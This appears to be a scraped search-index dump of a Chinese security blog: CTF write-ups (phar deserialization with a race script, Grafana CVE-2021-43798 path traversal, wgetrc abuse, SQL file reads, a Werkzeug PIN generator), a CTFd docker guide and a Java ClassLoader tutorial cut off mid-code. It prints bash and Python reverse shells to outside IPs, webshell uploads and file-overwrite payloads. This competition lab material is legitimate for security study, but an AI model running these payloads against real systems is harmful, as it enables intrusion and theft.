function filewrite($file,$data){ unlink($file); file_put_contents($file, $data); } if(isset($_POST['png'])){ $filename = $_POST['png']; if(!preg_match(\"/:|phar|\\/\\/|php/im\",$filename)){ $f = fopen($filename,\"r\"); $contents = fread($f, filesize($filename)); if(strpos($contents,\"flag{\") !== false){ filewrite($filename,\"Don't give me flag!!!\"); } } if(isset($_POST['flag'])) { $flag = (string)$_POST['flag']; if ($flag == \"Give me flag\") { filewrite(\"/tmp/flag.txt\", \"Don't give me flag\"); sleep(2); die(\"no no no !\"); } else { filewrite(\"/tmp/flag.txt\", $flag); //不给我看我自己写个flag。 } $head = \"uploads/head.png\"; unlink($head); if (symlink($filename, $head)) { echo \"成功更换头像\"; } else { unlink($filename); echo \"非正常文件，已被删除\"; }; } } 发现新大陆，这里大概的逻辑是这样，有一个类flag，在下面是把post[png]的值创建一个软链到uploads/head.png，这里用了unlink，又有class，而且涉及到文件操作，基本锁定是phar反序列化了，而unlink可以触发phar反序列化 这里的flag类里面执行了这样的文件 以root权限复制/flag 到 /tmp/flag.txt 但是这里会把post[flag]写进/tmp/flag.txt，这里就有矛盾了 如果我们要读文件/tmp/flag.txt，那么就得再次触发这个，那么就会把post[flag]写进/tmp/flag 这样我们之前写的flag就没了，那么这里就是需要一个竞争了 还有一个难点，我们得触发phar反序列化，而触发点在这 要进这个点，那么就只能让symlink报错才行，一开始尝试加个%00，虽然成功报错，但是无法反序列化了，这里是需添加脏数据来报错 那么就开始构造payload： phar文件构造 \u003c?php class flag{ public function copyflag(){ exec(\"/copyflag\"); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo \"SFTQL\"; } public function __destruct(){ $this-\u003ecopyflag(); } } $a = new flag(); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); $phar-\u003estartBuffering(); $phar-\u003esetStub(\"\u003c?php __HALT_COMPILER(); ?\u003e\"); $phar-\u003esetMetadata($a); $phar-\u003eaddFromString(\"test.txt\", \"test\"); $phar-\u003estopBuffering(); 上传拿到路径uploads/fe409167fb98b72dcaff5486a612a575.png 尝试添加脏数据，成功反序列化 那么就可以开始条件竞争了 phar反序列化的触发 软链指向uploads/head.png 访问uploads/head.png拿到信息 编写如下脚本 import requests import threading import time url = \"http://94b52e33-8f81-4589-899f-482f234c6cac.node4.buuoj.cn:81\" png = \"/uploads/head.png\" flag = \"../../../../../../tmp/flag.txt\" phar = \"\"\"phar://../../../../../../var/www/html/uploads/fe409167fb98b72dcaff5486a612a575.png/test.txtaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:2:2","tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/"},{"categories":["CTF"],"content":"Misc ","date":"2022-04-25","objectID":"/mrctf2022_wp/:1:0","tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/"},{"categories":["CTF"],"content":"checkin 翻源码找到flag ","date":"2022-04-25","objectID":"/mrctf2022_wp/:1:1","tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/"},{"categories":["CTF"],"content":"Web ","date":"2022-04-25","objectID":"/mrctf2022_wp/:2:0","tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/"},{"categories":["CTF"],"content":"WebCheckIn 上传东西上去发现没有回显，然后试着传其他的文件上去，发现随手写的php文件上传上去了，返回了路径 然后就往里面加了一句话木马进去了 然后发现根目录没有flag 而且只是www权限，猜测是不是要提权，看了一下php文件的权限就是root 于是直接用php文件反弹shell，直接反弹shell不行，会报错，这里用的curl反弹shell 进去直接find搜flag，成功拿到 ","date":"2022-04-25","objectID":"/mrctf2022_wp/:2:1","tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/"},{"categories":["CTF"],"content":"Bonus ","date":"2022-04-25","objectID":"/mrctf2022_wp/:3:0","tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/"},{"categories":["CTF"],"content":"Java_mem_shell_Basic 打开是tomcat的默认页面，进入manage看看，弱口令tomcat:tomcat登录成功，进了manage就可以随便getshell了 这里把冰蝎马打包一个war包，然后传上去拿到shell jar cvf hmnb.war shellmh.jsp 然后连进冰蝎，而且给的直接就是root权限 感觉冰蝎的终端不好用，反弹一个shell 直接find查找到flag ","date":"2022-04-25","objectID":"/mrctf2022_wp/:3:1","tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/"},{"categories":["CTF"],"content":"Java_mem_shell_Filter 进入是一个登录页面 目录扫描没啥结果 尝试爆破一个账号密码，爆破了一大堆，找不到可用的 尝试sql注入，试了很多，根本试不出报错，尝试跑一下sqlmap，还是无果 后来发现是log4j。。。 马上来打一波 进去以后，发现web目录有一个godzilla，密码拿到了，密钥是默认的key 连进哥斯拉里面 find没找到flag，结合题目名理解，可能是在filter内存马里面，这里用jmapdump出jvm内存 首先查看pid： ps -ef|grep java 然后dump：jmap -dump:format=b,file=e.bin 51 然后下载出来 找到flag ","date":"2022-04-25","objectID":"/mrctf2022_wp/:3:2","tags":null,"title":"[MRCTF2022] WP","uri":"/mrctf2022_wp/"},{"categories":["CTF"],"content":"New 相对于oh_my_lotto ，revenge进行了下面的更改 这么做，我们能走的就只有RCE了，而这里唯一能操作的一个地方就是这里，可以操作环境变量 os.environ[lotto_key] = lotto_value 这里有几个非预期解，先看看预期解 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:1:0","tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/"},{"categories":["CTF"],"content":"Intented writeup 这里可以操控环境变量，那么我们能做的事情就很多了，预期解是操控HOSTALIASES修改hosts 因为他的wget是通过域名下载的 os.system('wget --content-disposition -N lotto') 我们把伪造的hosts文件通过forecast路由传到服务器，然后修改环境变量把hosts指向/app/guess/forecast.txt 剩下的就是如何利用了，可以发现wget的参数是--content-disposition -N 对于这个参数的意义，我在谷歌找到了如下定义：他是可以由服务器端决定下载的文件，-N表示文件名不变进行覆盖 、 这样的话，我们就可以操控他下载的文件，去进行覆盖app.py 我查找了这个http头的语法 我们只需要在http头指定app.py即可把恶意的app.py覆盖掉源文件 这样的话我们就可以编写如下poc app.py import flask import os app = flask.Flask(__name__) @app.route(\"/rce\") def rce(): return str(os.popen('env').read()) if __name__ == \"__main__\": app.run(debug=True,host='0.0.0.0', port=8080) main.py import flask import os app = flask.Flask(__name__) @app.route(\"/\") def index(): with open('app.py','rb') as f: res = f.read() r = flask.make_response(res) response.headers['Content-Type'] = 'text/plain' response.headers['Content-Disposition'] = 'attachment; filename=app.py' return response if __name__ == \"__main__\": app.run(debug=True,host='0.0.0.0', port=8899) 在服务器启动main.py，然后上传伪造hosts文件 # hosts lotto domain 然后在lotto页面修改环境变量 HOSTALIASES /app/guess/forecast.txt 然后在服务器添加反代，把8899端口转发到80端口 可以发现app.py成功被覆盖 但是发现他还是原来的服务 是因为服务是gunicorn搭建起来的，他更新py文件以后不会实时更新，而gunicorn有一个pre-forked worker机制，当某个worker超时以后，就会让gunicorn重启该worker 我们可以抓包进行爆破服务让他崩溃重启 崩溃后，成功拿到flag 预期解至此 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:2:0","tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/"},{"categories":["CTF"],"content":"Unintented writeup 非预期解，这里我只知道一直就是利用WGETRC，配合http_proxy和output_document，覆盖本地的wget应用，然后利用wget完成RCE 查官方文档 可知，wget会找环境变量WGETRC，加载wgetrc文件 而具体利用wgetrc就是看这篇官方文档 这样的话，就是通过上传我们构造的wgetrc去进行攻击 这里注意了这几个配置项 # 把记录写到file里 output_document = file Set the output filename—the same as ‘-O file’. # 设置HTTP代理 http_proxy = string Use string as HTTP proxy, instead of the one specified in environment. 我在本机测试了一下，设置了http_proxy以后，wget下载的都是代理服务器的文件 通过这个代理服务器，我们可以通过修改代理服务器的东西去修改返回值，然后利用output_document进行覆盖 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:3:0","tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/"},{"categories":["CTF"],"content":"0x01 因为我们只能执行wget，所以我们直接索性覆盖wget 构造如下wgetrc文件 output_document = /usr/bin/wget http_proxy = test.huamang.xyz https_proxy = test.huamang.xyz 在代理服务器开一个80端口的web服务，写着反弹shell的命令 #!/bin/bash bash -c \"bash -i \u003c /dev/tcp/10.211.55.4/8888 1\u003c\u00260 2\u003c\u00260\" 把文件传上去，然后去lotto路由修改WGETRC的值为/app/guess/forecast.txt 然后触发wget命令，拿到flag 但是这个方法不够优雅，会覆盖掉wget，让其他选手没有体验感 ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:3:1","tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/"},{"categories":["CTF"],"content":"0x02 WGETRC还有一个参数 use_askpass=/bin/xxx 通过这个参数可以直接执行二进制文件，但是wget下载的文件，是没有x权限的，无法执行 所以我们可以通过覆盖掉/bin/sh后（题目使用的是/usr/bin/），再利用这个参数去执行他 所以具体步骤是： 首先上传如下文件，覆盖掉可以执行文件 output_document = /bin/sh http_proxy = test.huamang.xyz https_proxy = test.huamang.xyz 然后上传use_askpass参数去执行命令 use_askpass=/bin/sh 成功RCE ","date":"2022-04-20","objectID":"/ctf2022_oh-my-lotto-revenge/:3:2","tags":null,"title":"[*CTF2022] oh-my-lotto-revenge","uri":"/ctf2022_oh-my-lotto-revenge/"},{"categories":["技术分享"],"content":"前言 （使用github图床，请科学上网） 搭建校赛平台，这里是发现有一个很好看的ctfd的主题pixo 所以就想着来搭建这么一个平台，这次我打算使用docker来搭建，使用docker搭建有两条路可走 docker pull ctfd/ctfd docker-compose up ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:1:0","tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"},{"categories":["技术分享"],"content":"第一种方法的尝试 首先我是打算直接使用docker pull的方式来搭建的，的确可以搭建，但是主页会有广告 我想着怎么把他删掉，我把文件通过docker传回服务器 docker cp xx:/opt/CTFd ./ 然后下载到本机进行搜索，发现他存在于views.py文件里面 我对这个文件进行了审计，发现他会在setup的时候把内容写进html内，但是这里就有问题了，我如果是pull下来的镜像，我运行的时候他就已经启动了views.py，所以我无法修改里面的广告信息。所以我无奈之下只能放弃这个方法，我开始尝试docker-compose来进行搭建 ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:2:0","tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"},{"categories":["技术分享"],"content":"docker-compose 我从github下载到CTFd3.4.3版本的文件，我找到docker-compose.yml文件，修改了端口号一后，我就开始执行docker-compose up 我观察dockerfile，这里会进行apt的更新和下载 但是发现apt会下载的十分缓慢，等了很久很久都下不完，于是我选择进行换源，我dockerfile进行如下修改，增加如下命令执行 RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list RUN apt-get clean RUN apt-get update 我空了一段时间打开，发现apt已经处理好了，但是pip出问题了，他下载超时了。。 所以我还得对pip进行换源，我又对dockerfile进行如下的修改，添加阿里云源 RUN pip config set global.index-url http://mirrors.aliyun.com/pypi/simple RUN pip config set install.trusted-host mirrors.aliyun.com 看见pip已经把所有模块安装完毕，就当我以为快要成功的时候，发现这里又有报错，说我的80端口被占用，那我不可能因为一个docker就把80端口给让出来吧，所以我修改了docker-compose.yml文件，将Nginx的端口转发到其他的端口 这下总算成功的搭建起来了 ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:3:0","tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"},{"categories":["技术分享"],"content":"END 附上这次dockerfile和docker-compose.yml dockerfile FROMpython:3.7-slim-busterWORKDIR/opt/CTFdRUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads# hadolint ignore=DL3008RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.listRUN apt-get cleanRUN apt-get updateRUN pip config set global.index-url http://mirrors.aliyun.com/pypi/simpleRUN pip config set install.trusted-host mirrors.aliyun.comRUN apt-get update \\ \u0026\u0026 apt-get install -y --no-install-recommends \\ build-essential \\ python3-dev \\ libffi-dev \\ libssl-dev \\ git \\ \u0026\u0026 apt-get clean \\ \u0026\u0026 rm -rf /var/lib/apt/lists/*COPY requirements.txt /opt/CTFd/RUN pip install -r requirements.txt --no-cache-dirCOPY . /opt/CTFd# hadolint ignore=SC2086RUN for d in CTFd/plugins/*; do \\ if [ -f \"$d/requirements.txt\" ]; then \\ pip install -r $d/requirements.txt --no-cache-dir; \\ fi; \\ done;RUN adduser \\ --disabled-login \\ -u 1001 \\ --gecos \"\" \\ --shell /bin/bash \\ ctfdRUN chmod +x /opt/CTFd/docker-entrypoint.sh \\ \u0026\u0026 chown -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploadsUSER1001EXPOSE8000ENTRYPOINT [\"/opt/CTFd/docker-entrypoint.sh\"] docker-compose.yml version:'2'services:ctfd:build:.user:rootrestart:alwaysports:- \"50010:8000\"environment:- UPLOAD_FOLDER=/var/uploads- DATABASE_URL=mysql+pymysql://ctfd:ctfd@db/ctfd- REDIS_URL=redis://cache:6379- WORKERS=1- LOG_FOLDER=/var/log/CTFd- ACCESS_LOG=-- ERROR_LOG=-- REVERSE_PROXY=truevolumes:- .data/CTFd/logs:/var/log/CTFd- .data/CTFd/uploads:/var/uploads- .:/opt/CTFd:rodepends_on:- dbnetworks:default:internal:nginx:image:nginx:1.17restart:alwaysvolumes:- ./conf/nginx/http.conf:/etc/nginx/nginx.confports:- 50011:80depends_on:- ctfddb:image:mariadb:10.4.12restart:alwaysenvironment:- MYSQL_ROOT_PASSWORD=ctfd- MYSQL_USER=ctfd- MYSQL_PASSWORD=ctfd- MYSQL_DATABASE=ctfdvolumes:- .data/mysql:/var/lib/mysqlnetworks:internal:# This command is required to set important mariadb defaultscommand:[mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]cache:image:redis:4restart:alwaysvolumes:- .data/redis:/datanetworks:internal:networks:default:internal:internal:true ","date":"2022-04-19","objectID":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/:4:0","tags":null,"title":"校赛CTFd平台docker搭建—pixo主题","uri":"/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"},{"categories":["CTF"],"content":"Web ","date":"2022-04-17","objectID":"/ctf2022_wp/:1:0","tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/"},{"categories":["CTF"],"content":"oh-my-grafana 存在CVE-2021-43798 paylaod http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db 有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini 拿到了密码 # default admin user, created on startup admin_user = admin # default admin password, can be changed before first start of grafana, or in profile settings admin_password = 5f989714e132c9b04d4807dafeb10ade 进去后可以执行sql语句 查一下表名 拿flag ","date":"2022-04-17","objectID":"/ctf2022_wp/:1:1","tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/"},{"categories":["CTF"],"content":"oh-my-lotto 主要思路就是： 首先是随便摸一个奖，然后在result路由里面获得了结果，是上一轮的 正常情况下，你再次去摸奖，他会wget不改变名字的去下载乐透结果，也就等同于更新一次乐透结果，也就是这个代码 os.system('wget --content-disposition -N lotto') 但是在此之前，有这么一句代码 lotto_key = request.form.get('lotto_key') or '' lotto_value = request.form.get('lotto_value') or '' os.environ[lotto_key] = lotto_value 这里我们可以操作lotto_key和lotto_value 那么就可以把path改掉，让他执行不了wget命令，这样的话，/app/lotto_result.txt就和上一局是一样的 这样的话，我们再把上一次的乐透结果传上去，这样就能判断相等，获取flag if os.path.exists(\"/app/guess/forecast.txt\"): forecast = open(\"/app/guess/forecast.txt\", 'rb').read() if forecast == lotto_result: return flag 然后访问lotto路由拿到flag 注意有个坑，乐透结果之间是换行，所以文件构造的也应该是换行 ","date":"2022-04-17","objectID":"/ctf2022_wp/:1:2","tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/"},{"categories":["CTF"],"content":"oh-my-note admin:admin进入后台 在view note处存在sql注入，基本没有过滤，而且开启了debug http://124.70.185.87:5002/view?note_id=pt8q0tub5k59zh9b4hc5te6kdc6vjyn3%27 开了debug，需要构造pin码，利用sql注入进行文件读取 payload如下 ';create table fxz1(data text);# 读取mac地址/sys/class/net/eth0/address、/etc/machine-id、/proc/self/cgroup load data 写入创建的表 /etc/machine-id一般固定 1cc402dd0e11d5ae18db04a6de87223d ';LOAD DATA LOCAL INFILE \"/sys/class/net/eth0/address\" INTO TABLE fxz1;# ';LOAD DATA LOCAL INFILE \"/proc/self/cgroup\" INTO TABLE fxz2;# 查看结果 ' union select 1,2,3,4,(select(group_concat(data))from(fxz1))# 构造pin生成脚本 #sha1 import hashlib from itertools import chain probably_public_bits = [ 'ctf'# /etc/passwd 'flask.app',# 默认值 'Flask',# 默认值 '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到 ] private_bits = [ 'xxx',# /sys/class/net/eth0/address 16进制转10进制 'xxxxxx'# /etc/machine-id+/proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 587-976-623 进去console用python反弹shell，到根目录执行/readflag import os,pty,socket s=socket.socket() s.connect((\"101.35.***\",8866)) [os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\") ","date":"2022-04-17","objectID":"/ctf2022_wp/:1:3","tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/"},{"categories":["CTF"],"content":"Misc ","date":"2022-04-17","objectID":"/ctf2022_wp/:2:0","tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/"},{"categories":["CTF"],"content":"today “I’m anninefour. I love machine learning and data science. Flag is in my pocket!” 名字是anninefour，喜欢机器学习和数据科学，那么可以去各大机器学习平台社区搜搜这个人 在kaggle里面找到了这个人 https://www.kaggle.com/anninefour 绑定了一个推特 到了一个图片 看到对面有一个农夫果品生鲜超市 去高德搜了一下，全称直接搜没搜到，搜一半农夫果品，发现集中在上海，貌似是上海连锁，而且图片能非常相似的对上 在上海区域搜农夫果品生鲜超市，只有一个能完全对应上名字 拍照的小区在对面，叫花山名苑 在google地图评论里找到了flag ","date":"2022-04-17","objectID":"/ctf2022_wp/:2:1","tags":null,"title":"[*CTF2022] WP","uri":"/ctf2022_wp/"},{"categories":["Java"],"content":"前言 借用了先知社区的文章 的一张图来解释这个原理 负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。 类加载器介绍 类加载器大致分为两类： JVM 默认类加载器 用户自定义类加载器 ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:0:0","tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":["Java"],"content":"类加载器分类 引导类加载器(BootstrapClassLoader)：属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中、 扩展类加载器(ExtensionsClassLoader)：sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库 系统类加载器(AppClassLoader)：由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它 自定义类加载器(UserDefineClassLoader)：这个就是由用户自定义的类加载器 ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:1:0","tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":["Java"],"content":"ClassLoader类核心方法 除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类 ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。 loadClass：加载指定的java类 加载名称为name的类，返回的结果是java.lang.Class类的实例 可以看loadClass的源码 protected Class\u003c?\u003e loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class\u003c?\u003e c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求 findCLass：查找指定的Java类 protected Class\u003c?\u003e findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } findLoadedClass：查找JVM已经加载过的类 protected final Class\u003c?\u003e findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用 protected final Class\u003c?\u003e defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } resolveClass：链接指定Java类 protected final void resolveClass(Class\u003c?\u003e c) { resolveClass0(c); } private native void resolveClass0(Class c); ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":["Java"],"content":"自定义的类加载器 那么我们如果要自定义类加载器，那么就要进行如下步骤： 继承ClassLoader类 重载fandClass方法 利用defineClass方法将字节码转换成java.lang.class类对象 代码示例 messageTest public class messageTest { public static void main(String[] args){ System.out.println(\"This is the secret!\"); } } 对class文件加密的类 encodeTest import java.io.*; public class encodeTest { public static void main(String[] args) throws IOException { encode( new File(\"../out/production/Classloader/messageTest.class\"), new File(\"../out/production/Classloader/test/messageTest.class\") ); } public static void encode(File src, File out) throws IOException { FileInputStream fin; FileOutputStream fout; fin = new FileInputStream(src); fout = new FileOutputStream(out); int temp = -1; while ((temp = fin.read()) != -1) {// 读取一个字节 fout.write(temp ^ 0xff);// 取反输出 } fin.close(); fout.close(); } } 再写解密类，重写findclass方法 import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class decodeTest extends ClassLoader{ private String rootDir; public decodeTest(String rootDir) { this.rootDir = rootDir; } // 解密文件 public byte[] getClassData(String className) throws IOException { String path = rootDir + \"/\" + className.replace('.', '/') + \".class\"; // 将流中的数据转换为字节数组 InputStream is = null; ByteArrayOutputStream baos = new ByteArrayOutputStream(); is = new FileInputStream(path); byte[] buffer = new byte[1024]; int temp = -1; while ((temp = is.read()) != -1) { baos.write(temp ^ 0xff); } return baos.toByteArray(); } @Override // 重写覆盖findClass protected Class\u003c?\u003e findClass(String className) throws ClassNotFoundException { Class\u003c?\u003e c = findLoadedClass(className); if (c != null) { return c; } else { ClassLoader parent = this.getParent(); c = parent.loadClass(className); if (c != null) { System.out.println(\"父类成功加载\"); return c; } else {// 读取文件 转化成字节数组 byte[] classData = new byte[0]; try { classData = getClassData(className); } catch (IOException e) { e.printStackTrace(); } if (classData == null) { throw new ClassNotFoundException(); } else { // 调用defineClass()方法 c = defineClass(className, classData, 0, classData.length); return c; } } } } } 再写测试类 public class loadClassTest { public static void main(String[] args) throws ClassNotFoundException { decodeTest de = new decodeTest(\"/Users/liucheng/Desktop/JavaSec/out/production/Classloader/test/\"); Class\u003c?\u003e a = de.loadClass(\"messageTest\"); System.out.println(a); } } 由于我指定的class文件是加密后的class文件，所以java自带的类加载器就加载不了，这里我们成功用自定义的类加载器去解密加载到了messageTest ","date":"2022-03-30","objectID":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/:3:0","tags":null,"title":"[Java安全]类加载器ClassLoader","uri":"/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":["Java"],"content":"URLClassLoader URLClassLoader是ClassLoader的一个实现，拥有远程服务器上加载类的能力，通过这个URLClassLoader可以实现对一些webshell的远程加载 这里举个例子 我在Tomcat服务器处生成一个执行系统命令的class public class Test { public static void main(String[] args){ try{ 